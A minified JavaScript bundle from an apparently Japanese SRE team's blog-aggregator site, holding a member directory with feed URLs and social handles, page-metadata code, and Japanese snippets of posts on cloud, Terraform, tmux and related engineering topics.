"use strict";(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[983],{1807:function(e,t,o){o.d(t,{T:function(){return a}});let a=[{id:"yteraoka",name:"yteraoka",role:"SRE",bio:"ojisan",avatarSrc:"/avatars/yteraoka.jpeg",sources:["https://blog.1q77.com/index.xml","https://qiita.com/yteraoka/feed","https://medium.com/feed/@yteraoka","https://zenn.dev/yteraoka/feed"],includeUrlRegex:"",twitterUsername:"yteraoka",githubUsername:"yteraoka",websiteUrl:"https://blog.1q77.com/"},{id:"tozastation",name:"tozastation",role:"SRE",bio:"tarako_chan",avatarSrc:"/avatars/tozastation.jpg",sources:["https://qiita.com/tozastation/feed","https://tozastation.hashnode.dev/rss.xml","https://zenn.dev/tozastation/feed"],includeUrlRegex:"",twitterUsername:"tozastation",githubUsername:"tozastation",websiteUrl:"https://github.com/tozastation"},{id:"kyohmizu",name:"kyohmizu",role:"SRE",bio:"mizumoto",avatarSrc:"/avatars/kyohmizu.png",sources:["https://kyohmizu.hatenablog.com/feed","https://qiita.com/kyohmizu/feed"],includeUrlRegex:"",twitterUsername:"kyohmizu",githubUsername:"kyohmizu",websiteUrl:"https://profile.kyohmizu.com/"},{id:"nwiizo",name:"nwiizo",role:"Software Developer",bio:"The Passionate Programmer",avatarSrc:"/avatars/nwiizo.jpeg",sources:["https://syu-m-5151.hatenablog.com/feed","https://zenn.dev/nwiizo/feed","https://speakerdeck.com/nwiizo.rss"],includeUrlRegex:"",twitterUsername:"nwiizo",githubUsername:"nwiizo",websiteUrl:"https://nwiizo.github.io/"},{id:"skikkh",name:"skikkh",role:"SRE",bio:"skikkh",avatarSrc:"/avatars/skikkh.jpeg",sources:["https://qiita.com/skikkh/feed"],includeUrlRegex:"",twitterUsername:"skikkh",githubUsername:"skikkh",websiteUrl:""},{id:"toshikish",name:"toshikish",role:"SRE",bio:"Toshiki Shimomura",avatarSrc:"/avatars/toshikish.png",sources:["https://toshikish.hateblo.jp/feed","https://zenn.dev/toshikish/feed","https://qiita.com/toshikish/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"toshikish",websiteUrl:""},{id:"Sreake",name:"Sreake",role:"",bio:"This Is The Sreake Section Blog.",avatarSrc:"/avatars/sreake.png",sources:["https://sreake.com/feed/"],includeUrlRegex:"blog",excludeUrlRegex:"event",twitterUsername:"SreakeJ",githubUsername:"",websiteUrl:"https://sreake.com"},{id:"Reckoner",name:"Reckoner",role:"",bio:"This Is The Reckoner Section Blog.",avatarSrc:"/avatars/reckoner.png",sources:[],includeUrlRegex:"blog",excludeUrlRegex:"event",twitterUsername:"reckoner_japan",githubUsername:"",websiteUrl:"https://reckoner.io/"},{id:"tez",name:"Takuya Tezuka",role:"JB",bio:"tez",avatarSrc:"/avatars/tezuka.jpeg",sources:["https://qiita.com/TT_Private/feed"],includeUrlRegex:"qiita.com/TT_Private",twitterUsername:"tt0603",githubUsername:"taku-tez",websiteUrl:"https://www.wantedly.com/id/takuya_tezuka"},{id:"sosan01",name:"Soichiro Tsuchida",role:"SRE",bio:"sosan",avatarSrc:"/avatars/sosan01.png",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"sosan01",websiteUrl:""},{id:"atsuya0",name:"Atsuya Tsukada",role:"SRE",bio:"human",avatarSrc:"/avatars/atsuya0.jpg",sources:["https://zenn.dev/tayusa/feed","https://qiita.com/atsuya0/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"atsuya0",websiteUrl:"https://github.com/atsuya0"},{id:"abnoumaru",name:"Takaaki Abe",role:"SRE (Team Leader)",bio:"walker",avatarSrc:"/avatars/abnoumaru.jpeg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"abnoumaru",websiteUrl:"https://www.wantedly.com/id/abnoumaru"},{id:"genki-hashimoto",name:"Genki Hashimoto",role:"SRE",bio:"ongaku suki",avatarSrc:"/avatars/hashimoto.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"genki-hashimoto",websiteUrl:"https://www.wantedly.com/id/genki_hashimoto"},{id:"masasuzu",name:"SUZUKI, Masashi",role:"SRE",bio:"yasetai",avatarSrc:"/avatars/masasuzu.png",sources:["https://blog.masasuzu.net/feed"],includeUrlRegex:"",twitterUsername:"masasuz",githubUsername:"masasuzu",websiteUrl:"https://masasuzu.net"},{id:"kiyos",name:"Kyohei Saito",role:"SRE",bio:"haraheri",avatarSrc:"/avatars/kiyos.jpeg",sources:["https://zenn.dev/kyohei_saito/feed"],includeUrlRegex:"",twitterUsername:"kiyo_12_07",githubUsername:"kiyo-s",websiteUrl:""},{id:"mos914",name:"Yu Kaneko",role:"SRE",bio:"koke",avatarSrc:"/avatars/mos914.png",sources:["https://qiita.com/dirtymosschan/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"mos914",websiteUrl:""},{id:"unvavo",name:"nobu",role:"SRE",bio:"nobu",avatarSrc:"/avatars/nobu.png",sources:[],includeUrlRegex:"",twitterUsername:"unvavo",githubUsername:"unvavo",websiteUrl:""},{id:"hiroki-hasegawa",name:"Hiroki Hasegawa",role:"SRE",bio:"Let me know your favorite technology! ✌️",avatarSrc:"/avatars/hirokihasegawa.png",sources:["https://hiroki-hasegawa.hatenablog.jp/feed"],includeUrlRegex:"",twitterUsername:"Hiroki__IT",githubUsername:"hiroki-it",websiteUrl:"https://hiroki-it.github.io/tech-notebook/"},{id:"kaisato",name:"Kai Sato",role:"SRE",bio:"domo",avatarSrc:"/avatars/kaisato.png",sources:[],includeUrlRegex:"",twitterUsername:"KAI21441756",githubUsername:"kaitexio",websiteUrl:""},{id:"d-murota",name:"Daichi Murota",role:"SRE",bio:"d-murota",avatarSrc:"/avatars/d-murota.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"d-murota-w",websiteUrl:""},{id:"ysakurai",name:"Yusuke Sakurai",role:"SRE",bio:"ysakurai",avatarSrc:"/avatars/ysakurai.jpg",sources:["https://qiita.com/ys1/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"saku3",websiteUrl:""},{id:"tayakun",name:"Soichiro Taya",role:"SRE",bio:"tayakun",avatarSrc:"/avatars/tayakun.png",sources:["https://qiita.com/tayakun/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"tayatamn",websiteUrl:""},{id:"SatohJohn",name:"SatohJohn",role:"Software Developer",bio:"SatohJohn",avatarSrc:"/avatars/satohjohn.png",sources:["https://qiita.com/satohjohn/feed","https://zenn.dev/satohjohn/feed"],includeUrlRegex:"",twitterUsername:"satohjohn",githubUsername:"satohjohn",websiteUrl:""},{id:"bayobayo0324",name:"bayobayo0324",role:"back/front/app Engineer",bio:"osake daisuki",avatarSrc:"/avatars/bayobayo0324.jpeg",sources:["https://qiita.com/bayobayo0324/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"bayobayo0324",websiteUrl:""},{id:"myamamoto",name:"myamamoto",role:"SRE",bio:"human",avatarSrc:"/avatars/myamamoto.jpeg",sources:["https://zenn.dev/ureuzy/feed"],includeUrlRegex:"",twitterUsername:"ureuzy",githubUsername:"ureuzy",websiteUrl:""},{id:"seno",name:"seno",role:"DBRE",bio:"seno",avatarSrc:"/avatars/seno.jpeg",sources:["https://zenn.dev/nedoko_dok0dko/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"senohirona",websiteUrl:""},{id:"sakama",name:"sakama",role:"SRE",bio:"homo sapiens",avatarSrc:"/avatars/sakama.jpeg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"junichiro-sakama",websiteUrl:""},{id:"stakamura",name:"Shohei Takamura",role:"SRE",bio:"SRE",avatarSrc:"/avatars/stakamura.jpg",sources:["https://zenn.dev/hakushou41/feed"],includeUrlRegex:"",twitterUsername:"hakushou41",githubUsername:"hakushou41",websiteUrl:""},{id:"toVersus",name:"Tsubasa Nagasawa",role:"SRE",bio:"lazy programmer",avatarSrc:"/avatars/toVersus.png",sources:["https://qiita.com/toVersus/feed","https://zenn.dev/toversus/feed"],includeUrlRegex:"",twitterUsername:"toversus26",githubUsername:"toVersus",websiteUrl:""},{id:"raba-jp",name:"Hiroki Sakuraba",role:"Software Developer",bio:"meow",avatarSrc:"/avatars/raba-jp.jpg",sources:["https://zenn.dev/raba_jp/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"raba-jp",websiteUrl:""},{id:"ixsakra",name:"Ryosuke Sakurai",role:"SRE",bio:"ganbarumasu 'w'",avatarSrc:"/avatars/ixsakra.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:""},{id:"nnaka2992",name:"NAKADATE Naoki",role:"DBRE",bio:"what on the earth is Database?",avatarSrc:"/avatars/nnaka2992.jpg",sources:["https://nnaka2992.hatenablog.com/feed","https://zenn.dev/nnaka2992/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:"https://nnaka2992.hatenablog.com/"},{id:"nullzebra",name:"Satoru Kikuta",role:"SRE",bio:"Lena is great to be able to ride Flanker.",avatarSrc:"/avatars/kikuta.jpeg",sources:["https://qiita.com/nullzebra/feed","https://zenn.dev/nullzebra/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:""},{id:"satoken",name:"satoken",role:"SRE",bio:"How do you like Wednesday?",avatarSrc:"/avatars/satoken.jpg",sources:["https://zenn.dev/satoken/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:""},{id:"bells17",name:"bells17",role:"Software Engineer",bio:"Software Engineer",avatarSrc:"/avatars/bells17.jpeg",sources:["https://zenn.dev/bells17/feed","https://medium.com/feed/@bells17"],includeUrlRegex:"",twitterUsername:"bells17_",githubUsername:"bells17",websiteUrl:"https://bells17.io/"},{id:"yokoo-an209",name:"Annosuke Yokoo",role:"SRE",bio:"Buchiagemasu!",avatarSrc:"/avatars/yokoo.jpeg",sources:["https://qiita.com/yokoo-an209/feed","https://zenn.dev/yokoo_an209/feed","https://speakerdeck.com/parupappa2929.rss"],includeUrlRegex:"",twitterUsername:"866mfs",githubUsername:"parupappa",websiteUrl:""},{id:"hide-1",name:"Shuichi Inoue",role:"long-term internship student",bio:"I want to become a strong engineer :)",avatarSrc:"/avatars/hide-1.jpg",sources:["https://sreake.com/blog/config-connectortest/feed","https://sreake.com/blog/kubernetes-operation-with-chatgpt/feed","https://sreake.com/blog/kubernetes-operation-with-chatgpt4/feed","https://sreake.com/blog/chatgpt-slack-integration/feed"],includeUrlRegex:"",twitterUsername:"19MU50",githubUsername:"hide-1",websiteUrl:""},{id:"yuu0w0yuu",name:"Yutaro Shirayama",role:"SRE",bio:"( ˘ω˘ )",avatarSrc:"/avatars/shirayama.jpg",sources:["https://zenn.dev/yuu0w0yuu/feed"],includeUrlRegex:"",twitterUsername:"yuu0w0yuu",githubUsername:"yuu0w0yuu",websiteUrl:""},{id:"gawingowin",name:"Araki Shogo",role:"long-term internship student",bio:"born 2 be engineer",avatarSrc:"/avatars/araki-icon.jpg",sources:[],includeUrlRegex:"",twitterUsername:"GawinGowin",githubUsername:"GawinGowin",websiteUrl:""},{id:"nomadblacky",name:"Takumi Kadowaki",role:"Software Engineer @ Reckoner",bio:"Scala / Observability",avatarSrc:"/avatars/nomadblacky.jpg",sources:["https://zenn.dev/nomadblacky/feed"],includeUrlRegex:"",twitterUsername:"nomadblacky",githubUsername:"NomadBlacky",websiteUrl:""},{id:"kobuchi",name:"Shu Kobuchi",role:"Software Developer",bio:"mammalian",avatarSrc:"/avatars/kobuchi.jpeg",sources:["https://shu-kob.hateblo.jp/feed","https://speakerdeck.com/shukob.rss"],includeUrlRegex:"",twitterUsername:"shu_kob",githubUsername:"shu-kob",websiteUrl:""},{id:"kojake_300",name:"Yuki Iwasaki",role:"SRE",bio:"Splatoon",avatarSrc:"/avatars/yuki_iwasaki.png",sources:["https://qiita.com/kojake_300/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:""},{id:"kurita",name:"Kurita Keigo",role:"long-term internship student",bio:"I want to enginner the reliablity of the site",avatarSrc:"/avatars/kurita.jpg",sources:["https://kechigon.hatenablog.com/feed"],includeUrlRegex:"",twitterUsername:"kechigongon",githubUsername:"kechigon",websiteUrl:"https://www.wantedly.com/id/keigo_kurita_e"}].sort((e,t)=>e.id<t.id?-1:1)},9756:function(e,t,o){o.d(t,{T:function(){return n}});var a=o(5893),r=o(9008),i=o.n(r),s=o(2556);let n=e=>{let{path:t,title:o,description:r,ogImageUrl:n,noindex:c,removeSiteNameFromTitle:l}=e,u="".concat(s.v.siteRoot).concat(t||"");return(0,a.jsxs)(i(),{children:[(0,a.jsx)("title",{children:l?o:"".concat(o," | ").concat(s.v.siteMeta.title)}),(0,a.jsx)("meta",{property:"og:title",content:o}),(0,a.jsx)("meta",{property:"og:url",content:u}),(0,a.jsx)("meta",{name:"twitter:card",content:"summary_large_image"}),(0,a.jsx)("meta",{property:"og:site",content:s.v.siteMeta.title}),(0,a.jsx)("meta",{property:"og:image",content:n||"".concat(s.v.siteRoot,"/og.png")}),!!r&&(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)("meta",{name:"description",content:r}),(0,a.jsx)("meta",{property:"og:description",content:r})]}),t&&(0,a.jsx)("link",{rel:"canonical",href:u}),c&&(0,a.jsx)("meta",{name:"robots",content:"noindex"})]})}},518:function(e,t,o){o.d(t,{ci:function(){return i},gO:function(){return s},gb:function(){return n},n4:function(){return r}});var a=o(1807);function r(e){return a.T.find(t=>t.id===e)}function i(e){let t=new URL(e);return(null==t?void 0:t.hostname)||"blog"}function s(e){return"https://www.google.com/s2/favicons?domain=".concat(e)}function n(e){return"/members/".concat(encodeURIComponent(e))}o(8928)},8928:function(e){e.exports=JSON.parse('[{"title":"Azure Container Apps Jobs を Self-hosted GitHub Actions Runner として使う","contentSnippet":"GitHub Actions の Self-hosted Runner を安く用意する方法を探していたところ、 Azure の Container Apps Jobs というのが便利に使えるらしいというのを見つけたので試してみる。 チュートリアル:Azure Container Apps ジョブを使","link":"https://blog.1q77.com/2024/02/container-apps-jobs-self-hosted-github-actions-runner/","isoDate":"2024-02-23T10:05:41.000Z","dateMiliSeconds":1708682741000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"酸いも甘いもある Shared VPC（共有VPC） ~ GKE を Shared VPC で構築する際の苦悩 ~","contentSnippet":"","link":"https://speakerdeck.com/parupappa2929/suan-imogan-imoarushared-vpc-gong-you-vpc-gkewoshared-vpcdegou-zhu-suruji-noku-nao","isoDate":"2024-02-22T05:00:00.000Z","dateMiliSeconds":1708578000000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"Google Cloud Digital Leader合格！","contentSnippet":"Google Cloud Platdorm(GCP)認定資格の第一歩、Cloud Digital Leaderに合格しました！ちなみに、これまでの私の保有IT資格は、基本情報、応用情報、AWSクラウドプラクティショナーです。AWS資格の第一歩、クラウドプラクティショナーはUdemyの模擬試験を1周したら合格できたので、同様にGoogle Cloud Digital LeaderもUdemyの模擬試験を1周以上したら合格できました。なお、AWSは最初、ソリューションアーキテクトアソシエイト受けたものの勉強不足で落ち、クラウドプラクティショナーならなんとかなるのでは？と思い、その2週間後に受けたら受かりました。Udemyの模擬試験は途中保存もでき、採点、不正解のみ見直しなどができて便利ですよね。次はGCPのAssociate Cloud Engineerに挑戦したいと思います！皆さんもUdemyで勉強してIT資格をとりましょう！AWSやGCPの資格をとるならUdemyで学ぼう！","link":"https://shu-kob.hateblo.jp/entry/2024/02/21/225145","isoDate":"2024-02-21T13:51:45.000Z","dateMiliSeconds":1708523505000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Terraform workspace使って思ったこと","contentSnippet":"背景 そこまで大きな案件でもなく、 環境間の差分もあまりなさそうだったため 何より使ったことないから試してみようっていう好奇心 ある案件にて上記の理由から、Terraform workspaceを採用しました。 今回は、 […]The post Terraform workspace使って思ったこと first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/terraform-workspace/","isoDate":"2024-02-18T14:28:59.000Z","dateMiliSeconds":1708266539000,"authorName":"Sreake","authorId":"Sreake"},{"title":"個人開発でWebアプリの開発とデプロイの流れ","contentSnippet":"個人でWebサービスを開発したいけど、どのような流れで作っていけばいいのかわからない方向けです。個人開発でWebアプリを開発、デプロイをしたのでその流れを共有したいと思います。作ったもの麻雀戦績管理アプリ名付けて「PungPals」。雀荘などのオフラインでの対戦結果を残し、個人成績やランキングを確認できます。pungpals-service-xstpolfd4q-an.a.run.app開発とデプロイの流れ1.要件定義、設計実装がスムーズに進むために、しっかりとしておきましょう。以前記事を書いたので、参考にしてください。kechigon.hatenablog.com2.技術選定今回作ったアプリケーションはDjangoで開発し、Cloud Runにデプロイしています。選定理由は、Django: 経験があるから。Cloud Run: Djangoアプリのデプロイ方法の公式ドキュメントがあった(後ほど説明します)、マネージドな部分とカスタムできる部分のバランスがちょうどよかったから。でした。以下これらの技術を使って、開発デプロイまでの流れを説明していきます。3.Djangoを使ってアプリケーションを作成Djangoにはチュートリアルがあり、はじめての Django アプリ作成、その 1 | Django ドキュメント | Djangoはじめての Django アプリ作成、その2 | Django ドキュメント | Djangoはじめての Django アプリ作成、その 3 | Django ドキュメント | Djangoはじめての Django アプリ作成、その 4 | Django ドキュメント | Djangoを読めば開発方法がわかると思います。環境構築をし、実装し、ローカルで動作確認をしながら開発していきます。4.Cloud run へのデプロイDjangoアプリのCloud runへのデプロイ方法は公式ドキュメントにまとめられているので、これを見ながら進めます。cloud.google.comDjangoアプリケーションを環境に合わせて設定した後コンテナ化し、Cloud Runに載せます。それに伴い、Cloud SQL(データベース)、Secret Manager(シークレット管理)、Cloud Storage(静的アセットの保存など)、Cloud Build(CI/CD)、Artifact Registry(コンテナレジストリ)の作成、設定も行います。ドキュメントではGCRを使っていますが、現在非推奨なので、Artifact Registryをコンテナレジストリとして使用します。cloud.google.comオプションですが、GCPへのリソースの作成はTerraformを利用すると、構成管理ができ便利です。作成するインフラの図以上のことを行った後のGitHubリポジトリPungPalsのコードは公開しているので、参考にしていただければと思います。github.comこれから今後は、運用面の課題解決や集客などを行っていく予定なので、ブログにしていくつもりです！","link":"https://kechigon.hatenablog.com/entry/2024/02/13/125853","isoDate":"2024-02-13T03:58:53.000Z","dateMiliSeconds":1707796733000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"Google Cloudの管理を楽にする、 トイルを減らすクラウドガバナンス","contentSnippet":"","link":"https://speakerdeck.com/parupappa2929/google-cloudnoguan-li-wole-nisuru-toiruwojian-rasukuraudogabanansu","isoDate":"2024-02-11T05:00:00.000Z","dateMiliSeconds":1707627600000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"私のメンターがくれた初めてのターミナル管理、それはtmuxで私は新卒でした。","contentSnippet":"はじめに2024年2月5日夜の東京 外は雪が降っている。tmuxとの出会いは、新卒としての初めての職場でした。メンターがターミナルの管理において最初に紹介してくれたのがtmuxで、この出会いが私の開発効率と作業環境を大きく変革しました。tmuxの基礎を学んだ後、私は自分の開発環境をさらにカスタマイズし、tmuxを日々の作業効率化のために積極的に使い始めました。ここでは、私が実際に使っているtmuxの設定と、日常的に使うコマンドを紹介します。これらは、より快適なターミナル操作環境を実現するために役立ちます。この過程で、tmuxはただのツール以上のものになり、私の開発作業における最適なパートナーになりました。tmuxを使いこなすことで、複数のプロジェクトを同時に管理する能力が向上し、長時間の作業も中断せずに続けられるようになりました。リモートワークが増えた今では、tmuxのセッション管理機能が特に役立っています。サーバーに接続した状態で作業を行い、一時的に他のタスクに切り替えても、再びtmuxセッションに戻れば瞬時に作業を再開できます。tmuxを通じて、私はターミナル操作に関してプロフェッショナルな開発者としての成長していると実感しています。あとやっている感がとても出ているので好きです。tmuxとはtmuxは「ターミナルマルチプレクサ（Terminal Multiplexer）」の略称で、Linux系OSを中心に利用されています。このツールを使うと、一つのターミナルウィンドウ内で複数のセッション、ウィンドウ、ペインを効率的に管理することが可能になります。github.comセッションの管理： 一つのターミナルで複数のセッションを持ち、それぞれ独立した作業スペースとして利用できます。仕事とプライベート、複数のプロジェクト間でセッションを分けることができるため、タスクの切り替えがスムーズになります。ウィンドウとペイン： 一つのセッション内で、複数のウィンドウを開くことができ、さらにウィンドウをペインと呼ばれる小分けにすることが可能です。これにより、同一画面内で複数の作業を並行して行うことができ、効率的なマルチタスクが実現します。セッションの維持： tmuxの最大の特徴の一つは、ターミナルを終了してもセッションが維持されることです。これにより、長時間かかるコマンドを実行中にログアウトしてしまったり、接続が切れてしまったりしても、作業が中断される心配がありません。tmux設定のカスタマイズ私の.tmux.confファイルには、効率的なターミナル操作を可能にするための様々なカスタマイズが施されています。これらの設定を通じて、tmuxを自分にとって最適な作業環境に変えることができました。github.comプレフィックスキーの変更: デフォルト設定のCtrl+bをCtrl+qに変更しました。これは、より操作性の良いキーバインドに変更することで、他のショートカットキーとの競合を避け、操作のスムーズさを向上させるためです。キーバインドのカスタマイズ: vimを頻繁に使用することから、ペインの移動やリサイズをvim風に設定しています。これにより、キーボード操作の一貫性を保ちながら、直感的で迅速なウィンドウ管理を実現しています。ペインの分割: よく使用する|キーでペインを縦に分割し、-キーでペインを横に分割するように設定しました。これにより、柔軟かつ迅速に作業スペースをカスタマイズすることが可能になります。ステータスバーのカスタマイズ: ステータスバーには、現在のセッションの状態や時刻など、必要な情報を表示するよう設定しています。これにより、作業中に一目で状況を確認できるようになり、生産性の向上に貢献しています。プラグインの利用: tmux-resurrectやtmux-continuumなどのプラグインを導入しています。これらのプラグインは、セッションの自動保存や復元を可能にし、長時間にわたる作業や一時的な中断からのスムーズな再開を支援します。セッションの保存と復元は、プレフィックスキーに続けてCtrl+sで保存、Ctrl+rで復元することができます。これにより、突然のシステム停止や作業の中断が発生しても、簡単に前の状態に戻ることができます。さらに、tmuxのプラグインエコシステムは非常に豊富で、tmux-pluginsのリストからは、あらゆるニーズに応える特別なプラグインを見つけることができます。自分の作業フローに合わせて、最適なプラグインを選択し、tmux環境をさらにパワフルで柔軟なものにカスタマイズすることが可能です。よく利用するtmuxコマンドtmuxを効率的に使用するためには、日常的に役立つコマンドを知っておくことが重要です。ここでは、特に重宝するコマンドを紹介します。どんな時にでも味方になってくれるチートシートです。ちなみにチートシートには入れてないのですがprefix + e で全てのペインの操作、prefix + Eでそれらの解除などもインフラエンジニアとしては非常に重宝します。github.com以下は、日々の作業で特に役立つコマンドです。新規セッションの開始: tmux new -s <セッション名>コマンドで、特定の名前を持つ新規セッションを開始します。この機能を活用することで、プロジェクトやタスクごとにセッションを分け、作業を整理しやすくなります。セッションの一覧表示と切り替え: tmux lsコマンドで現在のセッション一覧を表示し、tmux attach -t <セッション名>またはtmux a -t <セッション名>で特定のセッションにアタッチします。これにより、複数のプロジェクトや作業を効率的に管理し、スムーズに切り替えることができます。ペインとウインドウの操作: tmuxでは、ペインの分割やウインドウの作成、移動、リサイズを柔軟に行うことができます。これらの操作をカスタマイズしたキーバインドで行うことで、必要に応じて作業スペースを自由に調整し、マルチタスク作業を効率的に進めることができます。マウス操作の有効化: set-option -g mouse onコマンドにより、tmux内でのマウス操作を有効にすることができます。マウスでペインを選択したり、サイズを調整したりすることが可能になり、キーボードとマウスを組み合わせた直感的な操作が実現します。これらのコマンドは、tmuxを使ってターミナル操作を効率化し、生産性を高めるための基本となります。tmuxをより深く理解し、活用することで、開発作業をより快適に、より効率的に行うことができるでしょう。さいごにtmuxとの出会いは、私の開発効率と作業環境を大きく変えただけでなく、インフラエンジニアとしての成長にも大きく寄与しました。日々の作業でtmuxを使いこなすことで、システムの監視、ログの分析、複数のサーバーへの同時操作など、インフラ管理の幅広いタスクを効率的にこなすスキルを身につけることができました。また、セッションの持続性は、長時間実行するプロセスの管理や、中断された作業の再開といった面で、インフラ作業の品質を向上させるのに役立ちました。tmuxのカスタマイズ性と拡張性を活かして、個人の作業環境を最適化することは、単に作業を効率化するだけではなく、技術者としての視野を広げ、問題解決能力を養う機会となりました。tmuxを深く理解し活用することで、インフラエンジニアリングの知識を実践的に拡張し、より複雑なシステムと効果的に向き合う力を養うことができました。tmux は3.4 がリリースされており今でも進化を続けている。愛している。github.comtmuxは、単なるツール以上の存在となり、私の技術的な成長を支えてくれる貴重なパートナーです。これからもtmuxを活用し続けることでしょう。しかし、人は変わる。実はZellijやターミナルもMAC標準なものを利用しているがAlacrittyが気になっているので検証と導入を進めている。","link":"https://syu-m-5151.hatenablog.com/entry/2024/02/06/110341","isoDate":"2024-02-06T02:03:41.000Z","dateMiliSeconds":1707185021000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"OWASP Top 10 for Large Language Model Applications をまとめる","contentSnippet":"はじめに Sreake 事業部インターン生の中林です。私は、Sreake 事業部長期インターン生として SRE 技術の技術検証を行っています。 今回は、Sreake 事業部で作成している LLM アプリケーションに対する […]The post OWASP Top 10 for Large Language Model Applications をまとめる first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/owasp-top-10-for-llm-application/","isoDate":"2024-02-05T09:29:32.000Z","dateMiliSeconds":1707125372000,"authorName":"Sreake","authorId":"Sreake"},{"title":"YugabyteDB ManagedのAlways Free枠を試そう","contentSnippet":"YugabyteDB Managedにフリートライアルがあるのは知っていたのですが、期間が限られたものしか無いと思っていました。YugabyteDBについて調べごとをしていたら機能制限はあるもののSandboxクラスターというクレジットカード登録すら不要でAlways Freeな利用枠があることを知りました。いままでローカルでYugabyteDBを建てたりminikube上で遊んでいたのですが、簡単な検証であればSandboxクラスターで十分です。この記事ではそんなYugabyteDB ManagedのSandboxクラスターを紹介します。 Sandbox Clusterの制限...","link":"https://zenn.dev/nnaka2992/articles/play_with_yugabytedb_managed_sandbox","isoDate":"2024-02-04T15:02:28.000Z","dateMiliSeconds":1707058948000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Google CloudのObservability : Personalized Service Health","contentSnippet":"はじめに先日、これまでプレビュー版だった、Google Cloudの稼働監視サービスのPersonalized Service HealthがGAになりました！https://cloud.google.com/blog/products/devops-sre/personalized-service-health-is-now-generally-available/?hl=en基本的な使用方法や設定はこちらのブログにて詳しく解説されていますので、ここでは運用面の機能を中心にPersonalized Service Healthを見ていきます。Google Cloudの障害情...","link":"https://zenn.dev/yokoo_an209/articles/8cc96cb8acb4bb","isoDate":"2024-02-04T11:02:42.000Z","dateMiliSeconds":1707044562000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"renovate で CircleCI の terraform_version を更新する","contentSnippet":"Circle CI の terraform Orb で terraform の version を指定するには次のようにしますが、この terraform_version の値に変数を 使うことが出来ず、tf ファイルや .tool-versions から読み出した値を使うことが出来ませんでした。 - terraform/install: terraform_version: 1.7.2 GitHub","link":"https://blog.1q77.com/2024/02/update-terraform-version-in-circleci-with-renovate/","isoDate":"2024-02-04T10:37:36.000Z","dateMiliSeconds":1707043056000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"raspberry piで学ぶ組込みLinuxデバイスドライバ開発Part2","contentSnippet":"はじめに前回からの続きです。前回までで基本的なデバイスドライバを作成して動作確認をしましたが、Linux上で完結するドライバであり、ラズパイ自体は使っていませんでした。今回はラズパイにLEDとスイッチを簡単な回路で接続して、それを操作するデバイスドライバを作成してみます。セミナーで使用したボートには4つのLEDと4つのスイッチが付いていたので1つのドライバで4つ同時に制御するものを作りましたが、回路を作るのが面倒なので1つずつです。ご承知おきくださいませ。 LEDを操作するデバイスドライバGPIO18番ピンにLEDを接続してこれを点けたり消したりできるモジュールを作...","link":"https://zenn.dev/satoken/articles/try-lkm-raspi2","isoDate":"2024-02-04T02:39:55.000Z","dateMiliSeconds":1707014395000,"authorName":"satoken","authorId":"satoken"},{"title":"生成AI活用の事例共有 - 大企業と中小企業・スタートアップでの違いに参加","contentSnippet":"2023年12月1日にスリーシェイクに入社し、SRE構築総合支援サービスSreake事業部のエンジニアとして2ヶ月が経ちました。私は生成AIアプリケーション開発を行なっており、ちょうど良さげな勉強会に参加したので、参加レポートを書きたいと思います。chatgptllm.connpass.com参加したのは、LLM Tokyo主催の「生成AI活用の事例共有 - 大企業と中小企業・スタートアップでの違い」。主催者は株式会社pipon代表の北爪聖也さん( @Seiyan1 )。北爪さんともう一人の登壇者が株式会社LangCore代表の北原麦郎さん(@yuno_miyako2 )。LangCore北原さんの事例発表最初は、LangCore北原さんの事例発表。LangCoreはAIの受託開発を行なっており、モジュール化して様々な案件に対応できるようにしている。生成AIで個人の生産性向上よりも大きなインパクトを出せるようにすることが目標。苦戦する案件もあるが、思った以上の成果を出せた案件もあった。大企業が生成AIを活用するモチベーションは他社から遅れを取らないようにするため、というのが最も大きい。検証項目は大きく分けて以下の3つ。中小企業、スタートアップにおけるAI案件の課題としては、予算が限られていること。案件の流れとしては以下。ヒアリングpipon北爪さんの事例発表・化粧品メーカーでの事例化粧品メーカーが動物実験を減らすため、生成AIで実験結果の推測をする・コンサルティングファームで社内の業務効率化大量の類似した質問をChatGPT+RAGでさばく・製薬会社のマーケティング売れる営業とそうでない営業の効果測定・自動車会社生成AIを使った新規事業の模索質疑応答質問「スケジューリングまでLLMでできるのか？」www.itmedia.co.jp質問「行政の生成AIPoCで94%の精度では使えないという事例があったが、100%の精度が求められることはあるのか？」アバターが間違えても、可愛いと捉えられるので導入しやすい。」「生成AIを使わなくても既存技術で解決できる課題も多かった。」「何でもLLM回答を得るのではなく、コスト削減のために、キャッシュを使って、同じ質問に同じ回答を返すようなことをしている。」検証ツール：AzureだとAzure Machine Learning プロンプト 